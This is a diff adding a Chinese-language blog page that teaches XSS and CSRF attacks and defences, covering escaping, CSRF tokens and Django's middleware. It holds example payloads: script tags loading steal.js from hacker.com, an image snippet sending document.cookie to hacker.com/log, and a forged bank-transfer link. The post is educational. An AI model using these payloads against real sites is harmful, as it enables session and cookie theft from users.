@@ -1,0 +1,956 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="xss,csrf,django," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XSS Cross-site scripting(XSS) is when an attacker can inject scripts into a page sent by your server. Browsers treat these injected scripts like any other scrip">
+<meta name="keywords" content="xss,csrf,django">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss csrf攻击与防御">
+<meta property="og:url" content="http://yoursite.com/2017/12/28/XSS&CRSF攻击/index.html">
+<meta property="og:site_name" content="Xuyang">
+<meta property="og:description" content="XSS Cross-site scripting(XSS) is when an attacker can inject scripts into a page sent by your server. Browsers treat these injected scripts like any other script in the page.">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://www.incapsula.com/images/illustrations/web-app-security-mini-site/sorted-XSS.png">
+<meta property="og:image" content="https://hydrasky.com/wp-content/uploads/2016/08/cross_site_request_forger_1.png.jpg">
+<meta property="og:image" content="http://maxprog.net.pl/wp-content/uploads/2016/05/CSRF_UX.png">
+<meta property="og:updated_time" content="2018-03-01T01:21:59.410Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss csrf攻击与防御">
+<meta name="twitter:description" content="XSS Cross-site scripting(XSS) is when an attacker can inject scripts into a page sent by your server. Browsers treat these injected scripts like any other script in the page.">
+<meta name="twitter:image" content="https://www.incapsula.com/images/illustrations/web-app-security-mini-site/sorted-XSS.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/12/28/XSS&CRSF攻击/"/>
+
+
+
+
+
+  <title>xss csrf攻击与防御 | Xuyang</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Xuyang</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">读书，交友，爱，思考</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/28/XSS&CRSF攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="XuyangBai">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/mine.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xuyang">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xss csrf攻击与防御</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-28T13:59:35+08:00">
+                2017-12-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/12/28/XSS&CRSF攻击/" class="leancloud_visitors" data-flag-title="xss csrf攻击与防御">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+		 <span>°C</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,811
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><blockquote>
+<p>Cross-site scripting(XSS) is when an attacker can inject scripts into a page sent by your server. Browsers treat these injected scripts like any other script in the page.</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="什么是XSS攻击"><a href="#什么是XSS攻击" class="headerlink" title="什么是XSS攻击"></a>什么是XSS攻击</h2><p><img src="https://www.incapsula.com/images/illustrations/web-app-security-mini-site/sorted-XSS.png" alt="Image result for XSS"></p>
+<p>XSS跨站脚本攻击是指攻击者向web页面中插入恶意的script代码, 从而将用户的一些隐私数据比如cookies, session发送给攻击者。 恶意代码一般是javascript，也可以包含html, flash等。</p>
+<p>举一个简单的例子，比如搜索页面中的输入框是</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"keyword"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"keyword"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其url是<code>http://mysite.com?q=&lt;keyword&gt;</code>那么我们就可以通过输入以下的内容来进行攻击:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">somekeyword&lt;script type=&quot;text/javascript&quot;&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这样就可以把用户的cookies信息打印出来。 进一步如果想获取用户的cookies，把他们发送到自己的服务器上，就可以使用下面的方法：将以下url发送到给该网站的用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mysite.com?q=NBA&lt;script type=&apos;text/javascript&apos; src=&quot;http://hacker.com/steal.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>对NBA感兴趣的用户就会打开这个连接，这样该网站就会加载hacker的steal.js文件，在这个文件中就可以获取用户的cookies，session等信息并发送到hacker服务器上。但是由于浏览器的<a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank" rel="noopener">同源策略</a>限制，A网页设置的cookie，B网页不能使用。 这个时候可以利用img标签，因为同源策略并不限制img标签。 </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.src = <span class="string">"http://hacker.com/log?"</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
+<p>只要这段代码被执行用户的cookies就会发送到黑客的服务器上.</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ol>
+<li>Stored XSS Attacks<br> The injected script is stored permanently on the target servers. The victim then retrieves this malicious script from the server when the browser sends a request for data. 这种攻击的注入脚本存在于目标服务器上，比如说twitter网站，如果hacker可以发布一条包含html标签的动态，而服务器并不会过滤它的时候，就会受到这种攻击。黑客可以发布一条动态：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Happy new year! &lt;script src=&quot;http://hacker.com/stealer.js&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>这样任何一个刷到这条动态的用户都会执行这个脚本，他们的cookies就会被盗</p>
+<ol>
+<li><p>Reflected XSS Attacks<br> Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other web site. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a “trusted” server.<br> 上一个section的例子就属于这种攻击，这中攻击需要黑客把链接挂在别的网站上或者email中诱导别的用户取点击</p>
+</li>
+<li><p>Dom-based XSS Attacks<br> The payload is executed as a result of modifying the DOM environment (in the victim’s browser) used by the original client-side script. That is, the page itself does not change, but the client side code contained in the page runs in an unexpected manner because of the malicious modifications to the DOM environment.<br> e.g.: <a href="https://www.acunetix.com/blog/articles/dom-xss-explained/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/dom-xss-explained/</a></p>
+</li>
+</ol>
+<h2 id="如何避免"><a href="#如何避免" class="headerlink" title="如何避免"></a>如何避免</h2><ul>
+<li>严格限制用户输入，最好不要让用户输入带标签的内容</li>
+<li>严格过滤用户的输入，比如使用Python的<code>cgi.escape()</code> 这里escape的意思是转义，比如把<code>&amp; 《 》 &quot; ,</code>分别转移成<code>&amp;amp &amp;lt &amp;gt &amp;quot &amp;#39</code></li>
+<li>限制cookies的过期时间</li>
+</ul>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><blockquote>
+<p>Cross-Site Request Forgery (<strong>CSRF</strong>) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated.</p>
+</blockquote>
+<h2 id="什么是CSRF攻击"><a href="#什么是CSRF攻击" class="headerlink" title="什么是CSRF攻击"></a>什么是CSRF攻击</h2><p>  <img src="https://hydrasky.com/wp-content/uploads/2016/08/cross_site_request_forger_1.png.jpg" alt="Image result for CSRF"><br>从这幅图中可以很清楚的看到CSRF的原理，假设你先用浏览器打开了中国银行的网站并登录，这时你的浏览器中已经存储了icbc.com的cookie，如果这个时候你有打开了一个网站 hacker.com。 而这个网站中包含恶意代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"www.icbc.com/transfer?toBankId=hacker&amp;money=100"</span>&gt;</span>恭喜你获得一部iPhoneX，快来领取吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样如果用户点击了这个连接，一次转账操作就神不知鬼不觉的发生了。因为浏览器存有icbc.com合法的cookie</p>
+<h2 id="如何避免-1"><a href="#如何避免-1" class="headerlink" title="如何避免"></a>如何避免</h2><h3 id="1-Synchronizer-token-pattern"><a href="#1-Synchronizer-token-pattern" class="headerlink" title="1. Synchronizer token pattern"></a>1. Synchronizer token pattern</h3><p>利用CSRF token来防御csrf攻击， csrf token有以下几种特点</p>
+<ul>
+<li>unique per user session</li>
+<li>large random value</li>
+<li>generated by a cryptographically secure random number generator</li>
+</ul>
+<p>当web application发起request之前的位置加一个隐藏的input域</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/transfer.do"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"CSRFToken"</span> <span class="attr">value</span>=<span class="string">"OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWE..."</span>&gt;</span></span><br><span class="line"> …</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>服务器端受到该请求后会验证这个CSRFtoken是否存在且正确（根据session找到服务器端存储的对应token），如果不正确则会认为可能是受到了一次csrf攻击。</p>
+<h3 id="2-token-cookie"><a href="#2-token-cookie" class="headerlink" title="2. token + cookie"></a>2. token + cookie</h3><p>这种方法是<a href="https://djangobook.com/csrf-methods-utilities/" target="_blank" rel="noopener">django采用的</a></p>
+<p>首先设置CSRF cookie，这是一个由CsrfViewMidlleware决定的值（通过sessionid生成一个特定的secret值加上随机的扰动）， 用户每次登录这个值都不同。 然后再所有的POST表单中设置一个隐藏的form field名为 <code>csrfmiddlewaretoken</code> 该字段的值也是secret加上随机扰动，每次response中的扰动都不同，所以每次刷新浏览器你都会发现<code>csrfmiddlewaretoken</code>值变了。</p>
+<p>这样对于每一个HTTP请求（除GET HEAD OPTIONS TRACE这些安全的方法之外），每次requests 服务器都会检查是否有csrf cookie，然后在检查<code>csrfmiddlewaretoken</code>值是否正确，如果二者有一个不正确就会返回403。验证<code>csrfmiddlewaretoken</code>时只会验证去掉随机扰动之后得值。 这样就可以有效的预防CRSF攻击，因为攻击者虽然可以利用已经登录的网站的cookie，却并不可以获取到<code>csrfmiddlewaretoken</code>，所以就不能登录目标网站。</p>
+<p><img src="http://maxprog.net.pl/wp-content/uploads/2016/05/CSRF_UX.png" alt="Image result for CSRF"></p>
+<p>实测：<br>第一次访问login页面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># request:</span><br><span class="line">GET /login HTTP/1.1</span><br><span class="line"></span><br><span class="line"># response:</span><br><span class="line">HTTP/1.0 200 OK </span><br><span class="line">Date: Thu, 28 Dec 2017 09:29:58 GMT </span><br><span class="line">Server: WSGIServer/0.2 CPython/3.4.5 </span><br><span class="line">Content-Type: text/html; </span><br><span class="line">charset=utf-8 </span><br><span class="line">Vary: Cookie </span><br><span class="line">X-Frame-Options: SAMEORIGIN </span><br><span class="line">Set-Cookie: csrftoken=TknlhiDQaC2ZZtyJRxwfz4265m5mH890SZcK0QN5S0RS4D1Wu8eY6todaEJ2pprl; expires=Thu, 27-Dec-2018 09:29:58 GMT; Max-Age=31449600; Path=/</span><br></pre></td></tr></table></figure>
+<p>根据set-cookie字段，浏览器将<code>csrftoken</code>这个cookie保存在这个网址目录下，返回的页面源代码中form表单有这么一项（每次刷新浏览器都会发现这个值是一直在变化的）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;csrfmiddlewaretoken&apos; value=&apos;k3PYp5nHdVlCeYLPS8cboQ0sgfNIKrj6jIEn8DxWVjavj8e2vJUUVfmzlxrosIBr&apos; /&gt;</span><br></pre></td></tr></table></figure>
+<p>但是这个时候csrftoken和csrfmiddlewaretoken都是没有用的，因为用户还没有登录，两个值并没有和session关联起来。然后输入username和password点击登录。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># request</span><br><span class="line">POST /login  HTTP/1.1 </span><br><span class="line">data: &#123;</span><br><span class="line">	&quot;username&quot;: &quot;xxx&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;xxx&quot;,</span><br><span class="line">	&quot;csrfmiddlewaretoken&quot;: &quot;&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># response</span><br><span class="line">Set-Cookie: csrftoken=OQyI1daHFy6s2oYCRFw7vzWJVVqvRWpdG8qdm0cUNqcMt4P9jdhKcxogtxRxGvTA; expires=Thu, 27-Dec-2018 09:40:10 GMT; Max-Age=31449600; Path=/</span><br><span class="line">Set-Cookie: sessionid=qhazgcpmkpum8neurg4ukh2ua4b90pff; expires=Thu, 11-Jan-2018 09:40:10 GMT; HttpOnly; Max-Age=1209600; Path=/</span><br></pre></td></tr></table></figure></p>
+<p>登录成功，用户完成了登录，可以看到设置了csrftoken和sessionid的cookie。此后再做别的操作都会加上这两个cookie</p>
+<p>一些有趣的操作：</p>
+<p>在一个浏览器中打开两个tab，都打开同一个网站，例如<a href="http://lintcode.com/accounts/signin/" target="_blank" rel="noopener">http://lintcode.com/accounts/signin/</a> 在其中一个tab上先登录，再在第二个tab上点登录，你会得到csrf failed</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting</a></p>
+<p><a href="https://docs.djangoproject.com/en/dev/ref/csrf/#how-it-works" target="_blank" rel="noopener">https://docs.djangoproject.com/en/dev/ref/csrf/#how-it-works</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
+          
+            <a href="/tags/csrf/" rel="tag"><i class="fa fa-tag"></i> csrf</a>
+          
+            <a href="/tags/django/" rel="tag"><i class="fa fa-tag"></i> django</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/22/ssh原理与应用/" rel="next" title="ssh原理与应用">
+                <i class="fa fa-chevron-left"></i> ssh原理与应用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/01/Life/2017年度总结/" rel="prev" title="2017年度总结">
+                2017年度总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/mine.jpg"
+                alt="XuyangBai" />
+            
+              <p class="site-author-name" itemprop="name">XuyangBai</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/XuyangBai" target="_blank" title="Github">
+                    
+                      <i class="fa fa-fw fa-globe"></i>Github</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.linkedin.com/in/%E6%97%AD%E9%98%B3-%E7%99%BD-419369140/" target="_blank" title="Linkedin">
+                    
+                      <i class="fa fa-fw fa-globe"></i>Linkedin</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS"><span class="nav-number">1.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是XSS攻击"><span class="nav-number">1.1.</span> <span class="nav-text">什么是XSS攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分类"><span class="nav-number">1.2.</span> <span class="nav-text">分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何避免"><span class="nav-number">1.3.</span> <span class="nav-text">如何避免</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CSRF"><span class="nav-number">2.</span> <span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是CSRF攻击"><span class="nav-number">2.1.</span> <span class="nav-text">什么是CSRF攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何避免-1"><span class="nav-number">2.2.</span> <span class="nav-text">如何避免</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Synchronizer-token-pattern"><span class="nav-number">2.2.1.</span> <span class="nav-text">1. Synchronizer token pattern</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-token-cookie"><span class="nav-number">2.2.2.</span> <span class="nav-text">2. token + cookie</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">3.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">XuyangBai</span>
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+<span class="post-meta-divider">|</span>
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("uFLr00lMNa5H9BGnQpg2Oq9p-gzGzoHsz", "dwYpENeLoJzOf7Xx4pMlY5BE");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
